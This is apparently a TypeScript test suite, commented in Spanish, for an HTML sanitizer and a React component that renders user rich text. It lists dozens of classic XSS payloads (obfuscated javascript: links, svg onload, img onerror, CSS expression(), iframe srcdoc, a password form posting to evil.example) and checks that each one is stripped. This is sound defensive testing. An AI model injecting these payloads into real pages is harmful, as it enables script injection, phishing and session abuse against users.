// =============================================================================
// html-seguro — el saneo del texto rico con lista blanca, y lo que dibuja HtmlSeguro
// =============================================================================
// Ejecuta lib/html-seguro.ts (`sanearHtml`, `textoDeHtml`, `validarHtmlRico`, `hrefSeguro`,
// `srcSeguro`) y la mitad pura de app/_ui/HtmlSeguro.tsx (la referencia `mako-adjunto:<uuid>`, la
// alarma `pareceSaneado` y `traducirAdjuntos`).
//
// ⚠️ lib/html-seguro.ts abre con `import 'server-only'`, que TIRA fuera de la condición
//    `react-server`, y `npm test` corre sin ella. Así que el saneo se ejecuta en un HIJO con
//    `--conditions=react-server` (el molde de tests/lead-funnel-tablero.test.ts), UNA vez para todo
//    el corpus, y devuelve lo que contestó en JSON. Lo de HtmlSeguro.tsx se importa directo: no
//    lleva `server-only` ni 'use client'.
//
// Los ataques son los CLÁSICOS de XSS: un `href` con entidades, mayúsculas, tabs y espacios; un
// `svg onload`; un `img onerror`; un `style` con `expression()`; un `data:`; una referencia a un
// adjunto que no es un uuid. El saneo tiene DOS capas (nuestras funciones en el transform y la lista
// de esquemas de sanitize-html): por eso las funciones de la primera capa se prueban también solas.
//
// Probado ROMPIÉNDOLO (07/10/2026), una rotura por vez sobre el archivo real, restaurado desde la
// copia guardada en memoria (verificado por hash). Con todo en su lugar: 13 pass / 0 fail. Cada
// rotura y lo que tumbó:
//   · `hrefSeguro` acepta cualquier `mako-adjunto:` (sin `idDeRef`)  → 10 / 3 (ataques, la referencia, la primera capa)
//   · el color del span con `/.*/` en vez de la regex de colores    → 11 / 2 (ataques, el `style`)
//   · `svg` en `allowedTags`                                        → 12 / 1 (ataques)
//   · la imagen sin `src` deja de sacarse en `exclusiveFilter`      → 11 / 2 (ataques, la referencia)
//   · `srcSeguro` acepta cualquier https                            → 11 / 2 (ataques, la primera capa)
//   · el link sale sin forzar `rel`                                 → 12 / 1 (lo que sí pasa, exacto)
//   · `traducirAdjuntos` sin `urlDibujable`                         → 12 / 1 (la traducción)
//   · `pareceSaneado` sin vaciar los valores antes de buscar `on…=` → 12 / 1 (la alarma)
//   · la sangría de la lista anidada en `textoDeHtml`               → 12 / 1 (el texto plano)
//   · `hrefSeguro` vuelto LISTA NEGRA (sólo rechaza `javascript:`)  → 12 / 1 (SOLO «la primera capa, sola»)
// ⚠️ La última es la que muestra por qué hay dos capas Y por qué se prueban por separado: con la
//    primera aflojada, el corpus de ataques sigue en verde porque la segunda (los esquemas de
//    sanitize-html) frena el `data:` y el `vbscript:`. Sin el test de la primera capa sola, ese
//    aflojamiento no lo vería nadie hasta que alguien afloje también la segunda.
//
// REVISIÓN ADVERSARIAL (08/10/2026): tres defectos que este archivo daba en VERDE, arreglados, y su
// rotura con el mismo método (restaurado de memoria, hash verificado). Con todo en su lugar: 14 / 0.
//   · `srcSeguro` aceptaba CUALQUIER ruta de hola-mako.com: `<img src=".../api/compartido/curso/
//     entrar?t=…">` salía tal cual, un GET con la sesión de cada uno que abre la clase. Ahora sólo
//     un archivo de imagen estático (`RUTA_IMAGEN_PROPIA`). Volver a la regla de antes → 12 / 2
//     (los ataques y la primera capa).
//   · `traducirAdjuntos` reemplazaba con una CADENA: «$&» en la URL metía el atributo viejo adentro
//     del nuevo. Volver a la cadena → 13 / 1 (la traducción).
//   · Nada probaba que el COMPONENTE llamara a la alarma y a la traducción: las funciones podían
//     estar perfectas y `<HtmlSeguro>` no usarlas. Sacarle la alarma → 13 / 1; sacarle la traducción
//     → 13 / 1 (los dos, «el COMPONENTE…»).

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { HtmlSeguro, idDeRef, refDeId, refsEnHtml, pareceSaneado, traducirAdjuntos, urlDibujable } from '../app/_ui/HtmlSeguro';

const RAIZ = join(import.meta.dirname, '..');
const U = '0f8fad5b-d9cb-469f-a165-70867728950e';
const U2 = '9a3c2b1d-1111-4222-8333-444455556666';

// ── El corpus ────────────────────────────────────────────────────────────────

/** Ataques: NINGUNO puede salir con algo ejecutable. */
const ATAQUES: string[] = [
  '<a href="javascript:alert(1)">x</a>',
  '<a href="JaVaScRiPt:alert(1)">x</a>',
  '<a href=" javascript:alert(1)">x</a>',
  '<a href="java&#09;script:alert(1)">x</a>',
  '<a href="java\tscript:alert(1)">x</a>',
  '<a href="java&#x0A;script:alert(1)">x</a>',
  '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>',
  '<a href="&#x6A;avascript:alert(1)">x</a>',
  '<a href="javascript&colon;alert(1)">x</a>',
  '<a href="&#0000106avascript:alert(1)">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<a href="//evil.example/x">x</a>',
  '<a href="https://banco.com@evil.example/">x</a>',
  '<a href="mailto:a@b.co?body=<script>">x</a>',
  '<svg onload=alert(1)><text>hola</text></svg>',
  '<svg><animate attributeName="href" to="javascript:alert(1)"/><a><text>x</text></a></svg>',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  '<img src=x onerror=alert(1)>',
  '<img src="x" onerror="alert(1)" />',
  '<IMG SRC="javascript:alert(1)">',
  '<img src="data:image/png;base64,iVBORw0KGgo=">',
  '<img src="https://evil.example/pixel.gif">',
  '<img src="http://hola-mako.com/a.png">',
  // Nuestro PROPIO origen, apuntado a una ruta que hace algo: un GET con las cookies de quien mira.
  '<img src="https://hola-mako.com/api/compartido/curso/entrar?t=abc">',
  '<img src="https://hola-mako.com/crm">',
  '<p onclick="alert(1)" style="background:url(javascript:alert(1))">p</p>',
  '<span style="color: expression(alert(1))">a</span>',
  '<span style="color: red; background-image: url(javascript:alert(1))">a</span>',
  '<span style="color: var(--x)">a</span>',
  '<div style="position:fixed;top:0;left:0;width:100%;height:100%">tapa</div>',
  '<iframe src="https://evil.example"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="javascript:alert(1)"></object><embed src="x.swf">',
  '<form action="https://evil.example"><input name="clave" type="password"><button>Entrar</button></form>',
  '<base href="https://evil.example/">',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<link rel="stylesheet" href="https://evil.example/x.css">',
  '<style>body{display:none}</style><p>texto</p>',
  '<script>alert(1)</script>',
  '<scr<script>ipt>alert(1)</script>',
  '<!--<img src=x onerror=alert(1)>-->',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  '<p><a href="mako-adjunto:no-es-un-uuid">x</a></p>',
  `<img src="mako-adjunto:${U.toUpperCase()}">`,
  `<img src="mako-adjunto:${U}x">`,
  `<img src="mako-adjunto:${U}" onerror="alert(1)">`,
  `<a href="mako-adjunto:${U}" onclick="alert(1)" class="mk-adjunto evil">P.pdf</a>`,
  '<a href="https://ok.example" target="_self" rel="opener">x</a>',
  '<ul data-type="javascript:alert(1)"><li data-type="taskItem" data-checked="javascript:x"><p>y</p></li></ul>',
  '<ol start="1;alert(1)"><li>a</li></ol>',
  '<template><img src=x onerror=alert(1)></template>',
  '<select><option><img src=x onerror=alert(1)></option></select>',
  '<textarea><img src=x onerror=alert(1)></textarea>',
  '<details open ontoggle=alert(1)><summary>x</summary></details>',
  '<a href="https://ok.example"><img src="x" onerror="alert(1)"></a>',
];

/** Lo que SÍ pasa, y cómo sale (exacto): lo que escribe el editor y lo que se pega de Word o Docs. */
const PASAN: Array<[string, string]> = [
  ['<p>Hola <strong>mundo</strong> <em>y</em> <u>más</u> <s>no</s> <code>x</code></p>', '<p>Hola <strong>mundo</strong> <em>y</em> <u>más</u> <s>no</s> <code>x</code></p>'],
  ['<h1>T</h1><h2>D</h2><h3>S</h3><h4>C</h4>', '<h2>T</h2><h2>D</h2><h3>S</h3><h3>C</h3>'],
  ['<p style="text-align: center; position: fixed">c</p>', '<p style="text-align:center">c</p>'],
  ['<p style="text-align: inherit">c</p>', '<p>c</p>'],
  ['<p><span style="color: #DC2626; font-size: 40px">r</span><span style="background-color: rgb(1, 2, 3)">f</span></p>', '<p><span style="color:#DC2626">r</span><span style="background-color:rgb(1, 2, 3)">f</span></p>'],
  ['<p><mark data-color="#FEF08A" style="background-color: #FEF08A; color: inherit">res</mark></p>', '<p><mark style="background-color:#FEF08A">res</mark></p>'],
  ['<p><a href="https://ej.com/a?b=1&c=2" target="_blank">ir</a></p>', '<p><a href="https://ej.com/a?b=1&amp;c=2" target="_blank" rel="noopener noreferrer nofollow">ir</a></p>'],
  ['<p><a href="mailto:hola@ej.com">escribir</a></p>', '<p><a href="mailto:hola@ej.com" target="_blank" rel="noopener noreferrer nofollow">escribir</a></p>'],
  [`<img src="mako-adjunto:${U}" alt="Plano" width="640" height="abc">`, `<img src="mako-adjunto:${U}" alt="Plano" width="640" />`],
  ['<img src="https://hola-mako.com/cono-ugc/a.webp" alt="">', '<img src="https://hola-mako.com/cono-ugc/a.webp" alt="" />'],
  [`<p>Ver <a class="mk-adjunto" href="mako-adjunto:${U2}">Precios.pdf</a></p>`, `<p>Ver <a href="mako-adjunto:${U2}" class="mk-adjunto" target="_blank" rel="noopener noreferrer nofollow">Precios.pdf</a></p>`],
  ['<ul><li><p>a</p></li></ul><ol start="3"><li><p>b</p></li></ol><blockquote><p>c</p></blockquote><hr><pre><code>d</code></pre><p>e<br>f</p>',
    '<ul><li><p>a</p></li></ul><ol start="3"><li><p>b</p></li></ol><blockquote><p>c</p></blockquote><hr /><pre><code>d</code></pre><p>e<br />f</p>'],
  // La lista de tareas tal cual la escribe TipTap: la casilla (`label`/`input`) no se guarda, la
  // dibuja el CSS desde `data-checked`.
  ['<ul data-type="taskList"><li data-type="taskItem" data-checked="true"><label><input type="checkbox" checked="checked"><span></span></label><div><p>hecho</p></div></li><li data-type="taskItem" data-checked="false"><label><input type="checkbox"><span></span></label><div><p>falta</p></div></li></ul>',
    '<ul data-type="taskList"><li data-type="taskItem" data-checked="true"><p>hecho</p></li><li data-type="taskItem" data-checked="false"><p>falta</p></li></ul>'],
  // Google Docs envuelve TODO en un <b> «normal»: no es negrita.
  ['<b style="font-weight:normal;" id="docs-internal-guid-1"><p dir="ltr"><span style="font-weight:700">Negrita</span> normal</p></b>', '<p>Negrita normal</p>'],
  // Word: clases, estilos mso, comentarios condicionales y <o:p>.
  ['<!--[if gte mso 9]><xml><w:WordDocument></w:WordDocument></xml><![endif]--><p class="MsoNormal" style="mso-margin-top-alt:auto">Hola<o:p></o:p></p>', '<p>Hola</p>'],
  ['<p></p>', ''],
  ['<p><br></p><p>   </p>', ''],
];

type Salida = {
  sanear: string[];
  idem: boolean[];
  pasan: string[];
  texto: Record<string, string>;
  href: Record<string, string | null>;
  src: Record<string, string | null>;
  validar: Record<string, { ok: boolean; error?: string; html?: string; texto?: string }>;
  gigante: { largo: number; ok: boolean };
};

let cache: Salida | null = null;
function correr(): Salida {
  if (cache) return cache;
  const url = pathToFileURL(join(RAIZ, 'lib/html-seguro.ts')).href;
  const codigo = `
    import { readFileSync } from 'node:fs';
    const m = await import(${JSON.stringify(url)});
    const d = JSON.parse(readFileSync(0, 'utf8'));
    const sanear = d.ataques.map((h) => m.sanearHtml(h));
    const idem = [...d.ataques, ...d.pasan].map((h) => { const a = m.sanearHtml(h); return m.sanearHtml(a) === a; });
    const pasan = d.pasan.map((h) => m.sanearHtml(h));
    const texto = Object.fromEntries(Object.entries(d.texto).map(([k, h]) => [k, m.textoDeHtml(h)]));
    const href = Object.fromEntries(d.hrefs.map((h) => [h, m.hrefSeguro(h)]));
    const src = Object.fromEntries(d.srcs.map((h) => [h, m.srcSeguro(h)]));
    const validar = Object.fromEntries(Object.entries(d.validar).map(([k, h]) => [k, m.validarHtmlRico(h === '__LARGO__' ? '<p>' + 'a'.repeat(m.TOPE_HTML + 10) + '</p>' : h)]));
    const g = m.sanearHtml('<p>' + '<b>x</b>'.repeat(120000) + '<a href="javascript:alert(1)">');
    console.log(JSON.stringify({ sanear, idem, pasan, texto, href, src, validar, gigante: { largo: g.length, ok: !/javascript/i.test(g) } }));
  `;
  const datos = {
    ataques: ATAQUES,
    pasan: PASAN.map(([h]) => h),
    texto: {
      completo: `<h2>Título</h2><p>Hola &amp; chau</p><ul><li><p>uno</p></li><li><p>dos</p><ul><li><p>sub</p></li></ul></li></ul><ol start="3"><li><p>a</p></li><li><p>b</p></li></ol><ul data-type="taskList"><li data-type="taskItem" data-checked="true"><p>hecho</p></li><li data-type="taskItem" data-checked="false"><p>falta</p></li></ul><p>Fin<br>línea</p><p>Ver <a href="mako-adjunto:${U}">Precios.pdf</a></p><img src="mako-adjunto:${U2}" alt="foto"><hr><blockquote><p>cita</p></blockquote>`,
      ataque: '<p>a<script>alert(1)</script>b</p>',
      vacio: '<p></p>',
    },
    hrefs: ['https://ej.com', 'http://ej.com/x y', 'mailto:hola@ej.com', `mako-adjunto:${U}`, `MAKO-ADJUNTO:${U}`, `mako-adjunto:${U}/x`,
      'javascript:alert(1)', ' JAVASCRIPT:alert(1)', 'java\tscript:alert(1)', 'data:text/html,x', '/relativa', '//evil.example', 'https://u:p@ej.com', 'ftp://ej.com', 'mailto:a b@c.d'],
    srcs: [`mako-adjunto:${U}`, 'https://hola-mako.com/a.png', 'https://evil.example/a.png', 'http://hola-mako.com/a.png', 'data:image/png;base64,AAAA', `mako-adjunto:${U.slice(0, -1)}`,
      'https://hola-mako.com/cono-ugc/curso/tapa.webp', 'https://hola-mako.com/api/compartido/curso/entrar?t=abc', 'https://hola-mako.com/api/x.png',
      'https://hola-mako.com/API/x.png', 'https://hola-mako.com/%61pi/x.png', 'https://hola-mako.com//api/x.png', 'https://hola-mako.com/_next/image?url=x',
      'https://hola-mako.com/a.png?v=1', 'https://hola-mako.com/a.png#x', 'https://hola-mako.com/crm', 'https://hola-mako.com/a.svg'],
    validar: { vacio: '', nulo: null, numero: 42, largo: '__LARGO__', bien: '<p>Hola <script>x</script><strong>che</strong></p>' },
  };
  const out = execFileSync(process.execPath, ['--conditions=react-server', '--import', 'tsx', '--input-type=module', '-e', codigo], {
    cwd: RAIZ, encoding: 'utf8', timeout: 170_000, input: JSON.stringify(datos), stdio: ['pipe', 'pipe', 'pipe'],
  });
  const linea = out.trim().split('\n').filter((x) => x.startsWith('{')).pop();
  assert.ok(linea, `el hijo no devolvió JSON:\n${out}`);
  cache = JSON.parse(linea) as Salida;
  return cache;
}

/** Lo que NUNCA puede salir del saneo, mirado adentro de las etiquetas (el texto viene escapado). */
function peligros(html: string): string[] {
  const out: string[] = [];
  if (!pareceSaneado(html)) out.push('la alarma de HtmlSeguro');
  for (const m of html.matchAll(/<[a-z][^>]*>/gi)) {
    const t = m[0];
    if (/javascript:|vbscript:|data:|expression\(|url\(/i.test(t)) out.push(`esquema o css en ${t}`);
    if (/\sstyle="[^"]*(position|url|expression|var\()/i.test(t)) out.push(`style libre en ${t}`);
    if (/\shref="(?!https?:\/\/|mailto:|mako-adjunto:[0-9a-f-]{36}")/i.test(t)) out.push(`href raro en ${t}`);
    if (/\ssrc="(?!https:\/\/hola-mako\.com\/|mako-adjunto:[0-9a-f-]{36}")/i.test(t)) out.push(`src raro en ${t}`);
    if (/\sclass="(?!mk-adjunto")/.test(t)) out.push(`clase rara en ${t}`);
    if (/^<(svg|math|iframe|object|embed|form|input|button|base|meta|link|style|script|template|select|textarea|details|div|label)\b/i.test(t)) out.push(`etiqueta ${t}`);
  }
  if (/<!--/.test(html)) out.push('comentario');
  return out;
}

// ── Los ataques ──────────────────────────────────────────────────────────────

test('ningún ataque clásico sale con algo ejecutable', { timeout: 180_000 }, () => {
  const s = correr();
  const malos = ATAQUES.map((a, i) => ({ a, out: s.sanear[i], p: peligros(s.sanear[i]) })).filter((x) => x.p.length);
  assert.deepEqual(malos, [], 'el saneo dejó pasar algo');
  // Y los que tienen que quedar en NADA, quedan en nada (sin una etiqueta vacía de recuerdo).
  const idx = (h: string) => ATAQUES.indexOf(h);
  assert.equal(s.sanear[idx('<img src=x onerror=alert(1)>')], '');
  assert.equal(s.sanear[idx('<svg onload=alert(1)><text>hola</text></svg>')], '', 'el texto de un svg no es texto de nadie');
  assert.equal(s.sanear[idx('<script>alert(1)</script>')], '');
  assert.equal(s.sanear[idx('<iframe srcdoc="<script>alert(1)</script>"></iframe>')], '');
  assert.equal(s.sanear[idx('<img src="https://evil.example/pixel.gif">')], '', 'una imagen de afuera es un pixel que espía al alumno');
  assert.equal(s.sanear[idx('<img src="https://hola-mako.com/api/compartido/curso/entrar?t=abc">')], '',
    'una imagen de nuestro origen que apunta a una ruta es un GET con la sesión de cada uno que abre la clase');
  assert.equal(s.sanear[idx('<img src="https://hola-mako.com/crm">')], '', 'una página no es una imagen');
});

test('un href con entidades, mayúsculas, tabs o espacios es texto, no un link', { timeout: 180_000 }, () => {
  const s = correr();
  for (let i = 0; i < 12; i++) assert.equal(s.sanear[i], 'x', `«${ATAQUES[i]}» → «${s.sanear[i]}»`);
  assert.equal(s.sanear[ATAQUES.indexOf('<a href="https://banco.com@evil.example/">x</a>')], 'x', 'un usuario en la URL se lee como el banco y va al otro');
});

test('una referencia a un adjunto que no es EXACTAMENTE un uuid no pasa', { timeout: 180_000 }, () => {
  const s = correr();
  assert.equal(s.sanear[ATAQUES.indexOf('<p><a href="mako-adjunto:no-es-un-uuid">x</a></p>')], '<p>x</p>');
  assert.equal(s.sanear[ATAQUES.indexOf(`<img src="mako-adjunto:${U.toUpperCase()}">`)], '');
  assert.equal(s.sanear[ATAQUES.indexOf(`<img src="mako-adjunto:${U}x">`)], '');
  assert.equal(s.sanear[ATAQUES.indexOf(`<img src="mako-adjunto:${U}" onerror="alert(1)">`)], `<img src="mako-adjunto:${U}" alt="" />`);
  assert.equal(s.href[`mako-adjunto:${U}`], `mako-adjunto:${U}`);
  assert.equal(s.href[`MAKO-ADJUNTO:${U}`], null);
  assert.equal(s.href[`mako-adjunto:${U}/x`], null);
  assert.equal(s.src[`mako-adjunto:${U.slice(0, -1)}`], null);
});

test('el style: sólo color y fondo en un span, sólo alineación en un párrafo, con valores validados', { timeout: 180_000 }, () => {
  const s = correr();
  assert.equal(s.sanear[ATAQUES.indexOf('<span style="color: expression(alert(1))">a</span>')], 'a');
  assert.equal(s.sanear[ATAQUES.indexOf('<span style="color: red; background-image: url(javascript:alert(1))">a</span>')], 'a', 'un color con nombre no pasa, y una imagen de fondo tampoco');
  assert.equal(s.sanear[ATAQUES.indexOf('<span style="color: var(--x)">a</span>')], 'a');
  assert.equal(s.sanear[ATAQUES.indexOf('<div style="position:fixed;top:0;left:0;width:100%;height:100%">tapa</div>')], 'tapa');
  assert.equal(s.sanear[ATAQUES.indexOf('<p onclick="alert(1)" style="background:url(javascript:alert(1))">p</p>')], '<p>p</p>');
});

test('hrefSeguro y srcSeguro: la primera capa, sola', { timeout: 180_000 }, () => {
  const s = correr();
  assert.deepEqual(s.href, {
    'https://ej.com': 'https://ej.com/',
    'http://ej.com/x y': 'http://ej.com/x%20y',
    'mailto:hola@ej.com': 'mailto:hola@ej.com',
    [`mako-adjunto:${U}`]: `mako-adjunto:${U}`,
    [`MAKO-ADJUNTO:${U}`]: null,
    [`mako-adjunto:${U}/x`]: null,
    'javascript:alert(1)': null,
    ' JAVASCRIPT:alert(1)': null,
    'java\tscript:alert(1)': null,
    'data:text/html,x': null,
    '/relativa': null,
    '//evil.example': null,
    'https://u:p@ej.com': null,
    'ftp://ej.com': null,
    'mailto:a b@c.d': null,
  });
  assert.deepEqual(s.src, {
    [`mako-adjunto:${U}`]: `mako-adjunto:${U}`,
    'https://hola-mako.com/a.png': 'https://hola-mako.com/a.png',
    'https://evil.example/a.png': null,
    'http://hola-mako.com/a.png': null,
    'data:image/png;base64,AAAA': null,
    [`mako-adjunto:${U.slice(0, -1)}`]: null,
    // De nuestro origen, sólo un ARCHIVO de imagen estático: ninguna ruta que haga algo.
    'https://hola-mako.com/cono-ugc/curso/tapa.webp': 'https://hola-mako.com/cono-ugc/curso/tapa.webp',
    'https://hola-mako.com/api/compartido/curso/entrar?t=abc': null,
    'https://hola-mako.com/api/x.png': null,
    'https://hola-mako.com/API/x.png': null,
    'https://hola-mako.com/%61pi/x.png': null,
    'https://hola-mako.com//api/x.png': null,
    'https://hola-mako.com/_next/image?url=x': null,
    'https://hola-mako.com/a.png?v=1': null,
    'https://hola-mako.com/a.png#x': null,
    'https://hola-mako.com/crm': null,
    'https://hola-mako.com/a.svg': null,
  });
});

// ── Lo que sí pasa ───────────────────────────────────────────────────────────

test('lo que escribe el editor (y lo que se pega de Word o Docs) sale exacto', { timeout: 180_000 }, () => {
  const s = correr();
  PASAN.forEach(([entra, sale], i) => assert.equal(s.pasan[i], sale, `«${entra}»`));
});

test('el saneo es IDEMPOTENTE: pasarlo dos veces no cambia nada', { timeout: 180_000 }, () => {
  const s = correr();
  const todos = [...ATAQUES, ...PASAN.map(([h]) => h)];
  const malos = s.idem.map((ok, i) => (ok ? null : todos[i])).filter(Boolean);
  assert.deepEqual(malos, []);
});

test('un cuerpo gigante no tira: se corta antes de parsear y sale saneado', { timeout: 180_000 }, () => {
  const s = correr();
  assert.ok(s.gigante.ok);
  assert.ok(s.gigante.largo > 0 && s.gigante.largo < 1_000_000);
});

// ── El texto plano y el camino de guardar ────────────────────────────────────

test('textoDeHtml: párrafos, listas (con sangría y número), tareas, el nombre de un archivo, sin imágenes', { timeout: 180_000 }, () => {
  const s = correr();
  assert.equal(s.texto.completo, [
    'Título', '', 'Hola & chau', '', '• uno', '• dos', '  • sub', '', '3. a', '4. b', '', '[x] hecho', '[ ] falta', '',
    'Fin', 'línea', '', 'Ver Precios.pdf', '', 'cita',
  ].join('\n'));
  assert.equal(s.texto.ataque, 'ab', 'el texto plano sale del HTML ya saneado: un script no deja su código');
  assert.equal(s.texto.vacio, '');
});

test('validarHtmlRico: vacío vale, otra cosa que texto no, y pasarse se RECHAZA (no se corta)', { timeout: 180_000 }, () => {
  const s = correr();
  assert.deepEqual(s.validar.vacio, { ok: true, html: '', texto: '' });
  assert.deepEqual(s.validar.nulo, { ok: true, html: '', texto: '' });
  assert.equal(s.validar.numero.ok, false);
  assert.deepEqual(s.validar.largo, { ok: false, error: 'La descripción es demasiado larga.' });
  assert.deepEqual(s.validar.bien, { ok: true, html: '<p>Hola <strong>che</strong></p>', texto: 'Hola che' });
});

// ── HtmlSeguro: la referencia, la alarma y la traducción ─────────────────────

test('la referencia: exacta, en minúsculas, y sólo la de un atributo', () => {
  assert.equal(idDeRef(`mako-adjunto:${U}`), U);
  assert.equal(idDeRef(`mako-adjunto:${U.toUpperCase()}`), null);
  assert.equal(idDeRef(`mako-adjunto:${U} `), null);
  assert.equal(idDeRef(` mako-adjunto:${U}`), null);
  assert.equal(idDeRef(42), null);
  assert.equal(refDeId(U), `mako-adjunto:${U}`);
  assert.equal(refDeId('nope'), null);
  const html = `<p>texto mako-adjunto:${U2} suelto</p><img src="mako-adjunto:${U}" alt="" /><a href="mako-adjunto:${U2}" class="mk-adjunto">a</a><img src="mako-adjunto:${U}" alt="" />`;
  assert.deepEqual(refsEnHtml(html), [U, U2], 'en orden, sin repetir, y la del texto suelto no cuenta… salvo que esté en un atributo');
  assert.deepEqual(refsEnHtml(`<p>mako-adjunto:${U}</p>`), []);
  assert.deepEqual(refsEnHtml(null), []);
});

test('la alarma: no dibuja lo que no salió del saneo, y no se asusta del TEXTO', () => {
  assert.equal(pareceSaneado('<p>Usa onclick= en tu botón y escribe javascript: si quieres</p>'), true);
  assert.equal(pareceSaneado('<p><a href="https://x.co" title="ve online=sí">x</a></p>'), true, 'un valor no es un manejador');
  assert.equal(pareceSaneado('<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>'), true);
  assert.equal(pareceSaneado('<img src="x" onerror="alert(1)" />'), false);
  assert.equal(pareceSaneado('<a href="javascript:alert(1)">x</a>'), false);
  assert.equal(pareceSaneado('<a href=" JavaScript:alert(1)">x</a>'), false);
  assert.equal(pareceSaneado('<svg><a>x</a></svg>'), false);
  assert.equal(pareceSaneado('<p>x</p><!-- y -->'), false);
});

test('la traducción: la URL de quien mira, escapada; lo que no se resuelve no queda roto', () => {
  const html = `<p>A</p><img src="mako-adjunto:${U}" alt="f" /><p><a href="mako-adjunto:${U2}" class="mk-adjunto" target="_blank" rel="noopener noreferrer nofollow">P.pdf</a> <a href="https://ok.co/" target="_blank" rel="noopener noreferrer nofollow">ok</a></p>`;
  const urls: Record<string, string> = {
    [`mako-adjunto:${U}`]: '/api/compartido/curso/adjunto?t=abc&c=3&a=' + U,
    [`mako-adjunto:${U2}`]: 'https://s.co/x?token=a&download=P.pdf',
  };
  const out = traducirAdjuntos(html, (r) => urls[r]);
  assert.match(out, new RegExp(`<img src="/api/compartido/curso/adjunto\\?t=abc&amp;c=3&amp;a=${U}" alt="f" />`));
  assert.match(out, /<a href="https:\/\/s\.co\/x\?token=a&amp;download=P\.pdf" class="mk-adjunto"/, 'la URL va escapada adentro del atributo');
  assert.match(out, /<a href="https:\/\/ok\.co\/"/, 'un link normal no se toca');
  // Una URL con una comilla no es dibujable: cerraría el atributo.
  assert.doesNotMatch(traducirAdjuntos(html, () => 'https://s.co/x?a="b'), /s\.co/);
  // Sin URL: la imagen se va y el chip queda sin destino (el nombre se sigue leyendo).
  const sin = traducirAdjuntos(html, () => null);
  assert.doesNotMatch(sin, /<img/);
  assert.match(sin, /<a class="mk-adjunto" target="_blank" rel="noopener noreferrer nofollow">P\.pdf<\/a>/);
  // Una función que devuelve algo que no es una URL dibujable NO lo mete en el atributo.
  const mala = traducirAdjuntos(html, () => 'javascript:alert(1)');
  assert.doesNotMatch(mala, /javascript/i);
  assert.doesNotMatch(traducirAdjuntos(html, () => '//evil.example/x'), /evil/);
  // Y una función que TIRA no tumba la pantalla.
  assert.doesNotMatch(traducirAdjuntos(html, () => { throw new Error('x'); }), /<img/);
  assert.equal(urlDibujable('blob:https://hola-mako.com/123'), true);
  assert.equal(urlDibujable('/\\evil.example'), false);
  // Un signo de pesos en la URL es un carácter, no una sustitución del `replace`: con la cadena de
  // reemplazo, «$&» metía el atributo viejo adentro del nuevo y «$$» se comía un pesos.
  const pesos = traducirAdjuntos(html, (r) => (r.endsWith(U2) ? 'https://s.co/x?n=US$$1$&b' : null));
  assert.match(pesos, /<a href="https:\/\/s\.co\/x\?n=US\$\$1\$&amp;b" class="mk-adjunto"/);
  assert.doesNotMatch(pesos, /mako-adjunto:/);
});

test('el COMPONENTE usa la alarma y la traducción, no sólo las funciones sueltas', () => {
  // Las funciones de arriba pueden estar perfectas y el componente no llamarlas: lo que se prueba
  // acá es lo que DIBUJA `<HtmlSeguro>`.
  const dibujar = (h: string, url: (ref: string) => string | null) =>
    renderToStaticMarkup(createElement(HtmlSeguro, { html: h, urlDeAdjunto: url, vacio: createElement('i', null, 'vacío') }));
  // (El componente avisa en la consola cuando se niega: acá se calla, es el caso esperado.)
  const err = console.error;
  console.error = () => {};
  const malo = (() => { try { return dibujar('<p>x</p><img src="x" onerror="alert(1)" />', () => null); } finally { console.error = err; } })();
  assert.doesNotMatch(malo, /onerror|<img/, 'un HTML que no salió del saneo se dibujó igual');
  assert.match(malo, /<i>vacío<\/i>/);
  const bueno = dibujar(`<p>Hola</p><img src="mako-adjunto:${U}" alt="f" />`, (r) => `/api/compartido/curso/adjunto?t=abc&a=${idDeRef(r)}`);
  assert.match(bueno, new RegExp(`<img src="/api/compartido/curso/adjunto\\?t=abc&amp;a=${U}" alt="f" />`));
  assert.doesNotMatch(bueno, /mako-adjunto:/, 'la referencia llegó al navegador sin traducir');
});
